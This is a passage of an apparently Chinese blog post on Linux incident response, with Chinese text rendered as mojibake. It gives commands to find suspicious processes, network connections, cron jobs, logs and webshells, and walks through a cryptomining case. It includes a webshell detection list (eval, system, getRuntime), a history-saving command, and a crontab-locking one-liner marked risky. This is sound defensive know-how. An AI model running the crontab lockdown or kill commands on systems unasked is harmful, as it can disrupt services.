å®šä½å¯ç–‘è¿›ç¨‹æ–‡ä»¶ä½ç½®</span><br><span class="line">lsof -p PID</span><br><span class="line">ls -al /proc/9109/exe </span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125557765.png" data-caption="image-20230215125557765"><img src="/../images/emergency/linux/image-20230215125557765.png" alt="image-20230215125557765"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125626387.png" data-caption="image-20230215125626387"><img src="/../images/emergency/linux/image-20230215125626387.png" alt="image-20230215125626387"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125646608.png" data-caption="image-20230215125646608"><img src="/../images/emergency/linux/image-20230215125646608.png" alt="image-20230215125646608"></a></p><h3 id="5ã€æ’æŸ¥å¤–è”æƒ…å†µ"><a href="#5ã€æ’æŸ¥å¤–è”æƒ…å†µ" class="headerlink" title="5ã€æ’æŸ¥å¤–è”æƒ…å†µ"></a>5ã€æ’æŸ¥å¤–è”æƒ…å†µ</h3><p><strong>lsof</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># æ˜¾ç¤ºå·²å»ºç«‹è¿æ¥ä¿¡æ¯</span><br><span class="line">lsof -i -sTCP:ESTABLISHED</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæ­£åœ¨ç›‘å¬çš„ç«¯</span><br><span class="line">lsof -i -sTCP:LISTEN</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹ç«¯å£ç»‘å®šçš„åº”ç”¨</span><br><span class="line">lsof -i :22</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŒ‡å®šä¸»æœºè¿æ¥çš„ä¿¡æ¯</span><br><span class="line">lsof -i@1.1.1.1</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºåŸºäºä¸»æœºä¸ç«¯å£è¿æ¥çš„ä¿¡æ¯</span><br><span class="line">lsof -i@1.1.1.1:3333</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125723942.png" data-caption="image-20230215125723942"><img src="/../images/emergency/linux/image-20230215125723942.png" alt="image-20230215125723942"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125742962.png" data-caption="image-20230215125742962"><img src="/../images/emergency/linux/image-20230215125742962.png" alt="image-20230215125742962"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125809753.png" data-caption="image-20230215125809753"><img src="/../images/emergency/linux/image-20230215125809753.png" alt="image-20230215125809753"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125830517.png" data-caption="image-20230215125830517"><img src="/../images/emergency/linux/image-20230215125830517.png" alt="image-20230215125830517"></a></p><p><strong>netstat</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹ç«¯å£å¼€æ”¾å’Œè¿æ¥æƒ…å†µ</span><br><span class="line">netstat -pantu</span><br><span class="line">netstat -anulpt</span><br><span class="line"></span><br><span class="line"># æŒ‡å®štcpè¿›ç¨‹</span><br><span class="line">netstat -tnap</span><br><span class="line"></span><br><span class="line"># æŒ‡å®šudpè¿›ç¨‹</span><br><span class="line">netstat -unap</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125851015.png" data-caption="image-20230215125851015"><img src="/../images/emergency/linux/image-20230215125851015.png" alt="image-20230215125851015"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125909675.png" data-caption="image-20230215125909675"><img src="/../images/emergency/linux/image-20230215125909675.png" alt="image-20230215125909675"></a></p><h3 id="6ã€ç›‘æ§æŒ‡å®šIPçš„é€šè®¯è¿›ç¨‹"><a href="#6ã€ç›‘æ§æŒ‡å®šIPçš„é€šè®¯è¿›ç¨‹" class="headerlink" title="6ã€ç›‘æ§æŒ‡å®šIPçš„é€šè®¯è¿›ç¨‹"></a>6ã€ç›‘æ§æŒ‡å®šIPçš„é€šè®¯è¿›ç¨‹</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while true; do netstat -antp | grep 10.10.10.1; done</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125955194.png" data-caption="image-20230215125955194"><img src="/../images/emergency/linux/image-20230215125955194.png" alt="image-20230215125955194"></a></p><h3 id="7ã€æ’æŸ¥è‡ªå¯é¡¹"><a href="#7ã€æ’æŸ¥è‡ªå¯é¡¹" class="headerlink" title="7ã€æ’æŸ¥è‡ªå¯é¡¹"></a>7ã€æ’æŸ¥è‡ªå¯é¡¹</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹æ‰€æœ‰çš„æœåŠ¡é¡¹ç›®</span><br><span class="line">systemctl list-unit-files</span><br><span class="line"></span><br><span class="line"># è¿‡æ»¤å‡ºæ‰€æœ‰çš„å¼€æœºå¯åŠ¨çš„é¡¹ç›®</span><br><span class="line">systemctl list-unit-files |grep enabled</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹ç›®</span><br><span class="line">chkconfig </span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æœåŠ¡è‡ªå¯çŠ¶æ€</span><br><span class="line">chkconfig  --list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130021004.png" data-caption="image-20230215130021004"><img src="/../images/emergency/linux/image-20230215130021004.png" alt="image-20230215130021004"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130044082.png" data-caption="image-20230215130044082"><img src="/../images/emergency/linux/image-20230215130044082.png" alt="image-20230215130044082"></a></p><h3 id="8ã€æ’æŸ¥è®¡åˆ’ä»»åŠ¡"><a href="#8ã€æ’æŸ¥è®¡åˆ’ä»»åŠ¡" class="headerlink" title="8ã€æ’æŸ¥è®¡åˆ’ä»»åŠ¡"></a>8ã€æ’æŸ¥è®¡åˆ’ä»»åŠ¡</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</span><br><span class="line">crontab  -l</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æŒ‡å®šç”¨æˆ·è®¡åˆ’ä»»åŠ¡</span><br><span class="line">crontab -u ç”¨æˆ·å -l</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</span><br><span class="line">cat /var/spool/cron/* # centos</span><br><span class="line">cat /var/spool/cron/crontabs/* # ubuntuçš„</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/cron.d/*</span><br><span class="line">cat /etc/cron.daily/* </span><br><span class="line">cat /etc/cron.hourly/* </span><br><span class="line">cat /etc/cron.monthly/*</span><br><span class="line">cat /etc/cron.weekly/</span><br><span class="line">cat /etc/anacrontab # å¼‚æ­¥å®šæ—¶</span><br><span class="line">cat /var/spool/anacron/*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat crontab  -l # æŸ¥çœ‹å®šæ—¶ä»»åŠ¡</span><br><span class="line">cat crontab â€“e # ç¼–è¾‘å®šæ—¶ä»»åŠ¡</span><br><span class="line">ls /var/spool/cron/  #æŸ¥çœ‹æ¯ä¸ªç”¨æˆ·è‡ªå·±çš„æ‰§è¡Œè®¡åˆ’</span><br><span class="line">sed &#x27;/gcc.sh/d&#x27; /etc/crontab &amp;&amp; chmod 0000 /etc/crontab &amp;&amp; chattr +i /etc/crontab   #åˆ é™¤è®¡åˆ’ä»»åŠ¡ä¸”æ§åˆ¶è®¡åˆ’ä»»åŠ¡ä¸èƒ½å†™ä¸œè¥¿ï¼Œæ…ç”¨ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130509214.png" data-caption="image-20230215130509214"><img src="/../images/emergency/linux/image-20230215130509214.png" alt="image-20230215130509214"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130538066.png" data-caption="image-20230215130538066"><img src="/../images/emergency/linux/image-20230215130538066.png" alt="image-20230215130538066"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130627186.png" data-caption="image-20230215130627186"><img src="/../images/emergency/linux/image-20230215130627186.png" alt="image-20230215130627186"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130643200.png" data-caption="image-20230215130643200"><img src="/../images/emergency/linux/image-20230215130643200.png" alt="image-20230215130643200"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130731090.png" data-caption="image-20230215130731090"><img src="/../images/emergency/linux/image-20230215130731090.png" alt="image-20230215130731090"></a></p><h3 id="9ã€æ’æŸ¥ç¯å¢ƒå˜é‡"><a href="#9ã€æ’æŸ¥ç¯å¢ƒå˜é‡" class="headerlink" title="9ã€æ’æŸ¥ç¯å¢ƒå˜é‡"></a>9ã€æ’æŸ¥ç¯å¢ƒå˜é‡</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130754649.png" data-caption="image-20230215130754649"><img src="/../images/emergency/linux/image-20230215130754649.png" alt="image-20230215130754649"></a></p><h3 id="10ã€æŸ¥çœ‹hostæ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹"><a href="#10ã€æŸ¥çœ‹hostæ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹" class="headerlink" title="10ã€æŸ¥çœ‹hostæ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹"></a>10ã€æŸ¥çœ‹hostæ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130816251.png" data-caption="image-20230215130816251"><img src="/../images/emergency/linux/image-20230215130816251.png" alt="image-20230215130816251"></a></p><h3 id="11ã€å¯ç–‘æ–‡ä»¶æ’æŸ¥"><a href="#11ã€å¯ç–‘æ–‡ä»¶æ’æŸ¥" class="headerlink" title="11ã€å¯ç–‘æ–‡ä»¶æ’æŸ¥"></a>11ã€å¯ç–‘æ–‡ä»¶æ’æŸ¥</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥æ‰¾æŒ‡å®šç›®å½•ä¸‹çš„æŒ‡å®šæ—¶é—´ä¸‹ç”Ÿäº§çš„æ–‡ä»¶</span><br><span class="line">find /æŒ‡å®šè·¯å¾„ -name &quot;*.jsp&quot; -newermt &quot;2023-10-01 00:00:00&quot; ! -newermt &quot;2024-01-01 00:00:00&quot; -exec ls -l &#123;&#125; \; &gt; /ä¿å­˜è·¯å¾„/result.txt</span><br><span class="line"></span><br><span class="line"># å…¨å±€æœç´¢æŒ‡å®šæ–‡ä»¶ååç¼€</span><br><span class="line">find / -name &quot;*.log&quot;</span><br><span class="line"></span><br><span class="line"># æŒ‡å®šæ—¶é—´æ®µå†…æœç´¢å…·æœ‰ &quot;.log&quot; æ‰©å±•åçš„æ–‡ä»¶</span><br><span class="line">find / -name &quot;*.log&quot; -exec grep -E &quot;^(YYYY-MM-DD HH:MM:SS|YYYY-MM-DD HH:MM:SS)&quot; &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"># å…¨å±€æœç´¢æŒ‡å®šæ—¶é—´æ®µç”Ÿæˆçš„æ–‡ä»¶</span><br><span class="line">find / -type f -newermt &quot;2022-01-01 00:00:00&quot; ! -newermt &quot;2023-12-31 23:59:59&quot; -exec ls -l --time-style=long-iso &#123;&#125; \; &gt;&gt; search_results.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure></div><h3 id="12ã€æ’æŸ¥æ—¥å¿—"><a href="#12ã€æ’æŸ¥æ—¥å¿—" class="headerlink" title="12ã€æ’æŸ¥æ—¥å¿—"></a>12ã€æ’æŸ¥æ—¥å¿—</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># ç»ˆç«¯è¾“å‡ºæŒ‡å®šæ—¥å¿—æŒ‡å®šæ—¶é—´çš„æ—¥å¿—</span><br><span class="line">cat /var/log/syslog | grep &quot;YYYY-MM-DD HH:MM:SS&quot;</span><br><span class="line"></span><br><span class="line"># ç»ˆç«¯è¾“å‡ºæ—¥å¿—ä¸­æŒ‡å®š ip çš„æ—¥å¿—</span><br><span class="line">cat /var/log/syslog | grep &quot;å¤–éƒ¨IPåœ°å€&quot;</span><br><span class="line"></span><br><span class="line"># ç»Ÿè®¡çˆ†ç ´ä¸»æœºrootè´¦å·çš„å¤±è´¥æ¬¡æ•°åŠip</span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line"># å®šä½å“ªäº›IPåœ¨çˆ†ç ´</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æˆåŠŸç™»å½•çš„æ—¥æœŸã€ç”¨æˆ·åã€IP</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿ</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr </span><br><span class="line"></span><br><span class="line"># æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®</span><br><span class="line">/var/log</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µ</span><br><span class="line">more /etc/rsyslog.conf</span><br><span class="line"></span><br><span class="line"># ç™»å½•æ—¥å¿—è®°å½•</span><br><span class="line">/var/log/secure</span><br><span class="line"></span><br><span class="line"># ç™»å½•å¤±è´¥è®°å½•</span><br><span class="line">/var/log/btmp</span><br><span class="line"></span><br><span class="line"># ç™»å½•æˆåŠŸè®°å½•</span><br><span class="line">/var/log/wtmp</span><br><span class="line"></span><br><span class="line"># æœ€åä¸€æ¬¡ç™»å½•</span><br><span class="line">/var/log/lastlog</span><br><span class="line"></span><br><span class="line"># å†å²å‘½ä»¤</span><br><span class="line">history</span><br><span class="line"></span><br><span class="line"># æ–‡ä»¶å†…å®¹ä¸­çš„æ¶æ„å‡½æ•°</span><br><span class="line">PHPï¼ševal(ã€system(ã€assert(</span><br><span class="line">JSPï¼šgetRunTime(ã€ FileOutputStream(</span><br><span class="line">ASPï¼ševal(ã€execute(ã€ ExecuteGlobalï¼ˆ</span><br><span class="line"></span><br><span class="line"># ä¿å­˜å†å²å‘½ä»¤</span><br><span class="line">cat .bash_history &gt;&gt;history.txt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130902211.png" data-caption="image-20230215130902211"><img src="/../images/emergency/linux/image-20230215130902211.png" alt="image-20230215130902211"></a></p><h3 id="13ã€webshell-æŸ¥æ€"><a href="#13ã€webshell-æŸ¥æ€" class="headerlink" title="13ã€webshell æŸ¥æ€"></a>13ã€webshell æŸ¥æ€</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># æ²³é©¬ https://www.shellpub.comï¼Œæ‰«æå®Œæˆä¹‹åç»“æœä¼šä¿å­˜ä¸ºresult.csvæ–‡ä»¶ï¼Œä½¿ç”¨è®°äº‹æœ¬æˆ–è€…excelæ‰“å¼€æŸ¥çœ‹</span><br><span class="line">./hm scan ä½ çš„webç›®å½•</span><br><span class="line">./hm deepscan ä½ çš„webç›®å½•ï¼ˆæ‰«ææ—¶å¼€å¯æ·±åº¦è§£ç  ï¼‰</span><br></pre></td></tr></table></figure></div><h3 id="14ã€å†…å­˜é©¬æŸ¥æ€"><a href="#14ã€å†…å­˜é©¬æŸ¥æ€" class="headerlink" title="14ã€å†…å­˜é©¬æŸ¥æ€"></a>14ã€å†…å­˜é©¬æŸ¥æ€</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># æ²³é©¬å†…å­˜é©¬ä¸“æ€ï¼Œè‡ªåŠ¨æ‰«æjavaè¿›ç¨‹ï¼Œè‡ªåŠ¨æ¨¡å¼ä¸‹ä»…æ”¯æŒæ‰«æ tomcat/weblogic/jboss åº”ç”¨è¿›ç¨‹</span><br><span class="line">sudo ./hmj javascan</span><br><span class="line"></span><br><span class="line"># æŒ‡å®šè¿›ç¨‹æ‰«ææ¨¡å¼ï¼Œç¨‹åºä»…æ‰«æ -p æŒ‡å®šçš„è¿›ç¨‹</span><br><span class="line">sudo ./hmj javascan -p 3361</span><br><span class="line"></span><br><span class="line"># ä¹Ÿå¯ä»¥ä¸€æ¬¡æŒ‡å®šå¤šä¸ªè¿›ç¨‹ id è¿›è¡Œæ‰«æ</span><br><span class="line">sudo ./hmj javascan -p 3361,3356</span><br><span class="line"></span><br><span class="line"># é»˜è®¤æƒ…å†µä¸‹åœ¨å½“å‰æ‰§è¡Œç›®å½•ä¸‹ç”Ÿæˆ result.csv å’Œ data.db æ–‡ä»¶ï¼Œæœªè”ç½‘æƒ…å†µä¸‹è¿˜ä¼šç”Ÿæˆ result.zip æ–‡ä»¶</span><br><span class="line">- result.csv: æ¶æ„å†…å®¹çš„åˆ—è¡¨ï¼ŒåŒ…æ‹¬æ¶æ„ç±»å‹å’Œè·¯å¾„</span><br><span class="line">- data.db: æ£€æµ‹ç»“æœçš„è¯¦ç»†ä¿¡æ¯ï¼Œsqlite æ–‡ä»¶</span><br><span class="line">- result.zip: æ£€æµ‹åˆ°çš„æ¶æ„å†…å®¹</span><br><span class="line">- output æŒ‡å®šè¾“å‡ºæ‰«æç»“æœçš„ç›®å½•</span><br></pre></td></tr></table></figure></div><h3 id="15ã€æ¸…é™¤å¯ç–‘è¿›ç¨‹ä¸æ–‡ä»¶"><a href="#15ã€æ¸…é™¤å¯ç–‘è¿›ç¨‹ä¸æ–‡ä»¶" class="headerlink" title="15ã€æ¸…é™¤å¯ç–‘è¿›ç¨‹ä¸æ–‡ä»¶"></a>15ã€æ¸…é™¤å¯ç–‘è¿›ç¨‹ä¸æ–‡ä»¶</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># æ¸…é™¤è¿›ç¨‹ï¼š</span><br><span class="line">ps -aux</span><br><span class="line">ps -elf | grep 66579   </span><br><span class="line">kill -9 66579</span><br><span class="line"></span><br><span class="line"># æ¸…é™¤æ–‡ä»¶ï¼š</span><br><span class="line">ps -aux</span><br><span class="line">ls -al /proc/67730/exe</span><br><span class="line">rm -f /home/c2test</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨ ps æŸ¥çœ‹å¯åŠ¨ æ—¶é—´å¹¶ æ€æ‰å±é™©è¿›</span><br><span class="line">ps -p 7224(è¿›ç¨‹PID) -o lstart</span><br><span class="line">kill -9 7224(è¿›ç¨‹PID)</span><br></pre></td></tr></table></figure></div><h2 id="ä¸‰ã€ç‰¹å®šåœºæ™¯"><a href="#ä¸‰ã€ç‰¹å®šåœºæ™¯" class="headerlink" title="ä¸‰ã€ç‰¹å®šåœºæ™¯"></a>ä¸‰ã€ç‰¹å®šåœºæ™¯</h2><h3 id="æŒ–çŸ¿äº‹ä»¶"><a href="#æŒ–çŸ¿äº‹ä»¶" class="headerlink" title="æŒ–çŸ¿äº‹ä»¶"></a>æŒ–çŸ¿äº‹ä»¶</h3><p>é€šè¿‡æ¨¡æ‹ŸæŒ–çŸ¿äº‹ä»¶å¼€å±•åº”æ€¥å“åº”ï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“é€šå¸¸æŒ–çŸ¿ä¸€ä¸ªæ˜æ˜¾ç‰¹å¾å°±æ˜¯èµ„æºå ç”¨ï¼Œå†…å­˜é£™å‡ã€‚é€šè¿‡è€…ä¸€ç‰¹å¾å¾ˆå®¹æ˜“åˆ¤æ–­æ˜¯å¦ä¸ºæŒ–çŸ¿äº‹ä»¶ï¼Œå½“ç„¶å…·ä½“æ¡ˆä¾‹å¾—å…·ä½“åˆ†æã€‚</p><h4 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h4><p>1ã€æŸ¥çœ‹å ç”¨æƒ…å†µã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹cpuå ç”¨æƒ…å†µï¼ˆåŠ¨æ€ï¼‰</span><br><span class="line">top -c -o %CPU</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹CPUå ç”¨å‰åçš„è¿›ç¨‹</span><br><span class="line">ps -eo user,pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 10</span><br><span class="line"></span><br><span class="line"># æŒ‰CPU ä½¿ç”¨ç‡ä»é«˜åˆ°åº•æ’åº</span><br><span class="line">ps -ef --sort -pcpu</span><br><span class="line"></span><br><span class="line"># æŒ‰å†…å­˜ä»é«˜åˆ°ä½</span><br><span class="line">ps -ef --sort -pmem</span><br></pre></td></tr></table></figure></div><p>2ã€å®šä½æ¶æ„ç¨‹åº</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># å®šä½å¯ç–‘è¿›ç¨‹çš„ç¨‹åºæ˜¯ä»€ä¹ˆ</span><br><span class="line">ps -aux</span><br><span class="line">ps -ef | grep pidå·</span><br><span class="line"></span><br><span class="line"># å®šä½å¯ç–‘è¿›ç¨‹æ–‡ä»¶ä½ç½®</span><br><span class="line">lsof -p PID</span><br><span class="line">ls -al /proc/9109/exe </span><br></pre></td></tr></table></figure></div><p>3ã€æ¸…é™¤è¿›ç¨‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># æ€æ‰è¿›ç¨‹ </span><br><span class="line">kill -9 66579</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æ˜¯å¦å­˜åœ¨å­è¿›ç¨‹</span><br><span class="line">ps ajfx</span><br><span class="line">systemctl status</span><br><span class="line"></span><br><span class="line"># æ€æ‰è¿›ç¨‹ç»„</span><br><span class="line">kill -9 -pid</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨ ps æŸ¥çœ‹å¯åŠ¨æ—¶é—´å¹¶æ€æ‰å±é™©è¿›</span><br><span class="line">ps -p 7224(è¿›ç¨‹PID) -o lstart</span><br><span class="line">kill -9 7224(è¿›ç¨‹PID)</span><br></pre></td></tr></table></figure></div><p>4ã€ç—…æ¯’åˆ†æ</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># å¾®æ­¥</span><br><span class="line">https://s.threatbook.com/</span><br><span class="line"></span><br><span class="line"># PCHunter</span><br><span class="line">https://scan.anxinsec.com/</span><br><span class="line"></span><br><span class="line"># virustotal</span><br><span class="line">https://www.virustotal.com/gui/home/upload</span><br><span class="line"></span><br><span class="line"># 360</span><br><span class="line">https://ata.360.net/</span><br><span class="line"></span><br><span class="line"># å“ˆå‹ƒ</span><br><span class="line">https://habo.qq.com/</span><br></pre></td></tr></table></figure></div><h3 id="å‹’ç´¢ç—…æ¯’"><a href="#å‹’ç´¢ç—…æ¯’" class="headerlink" 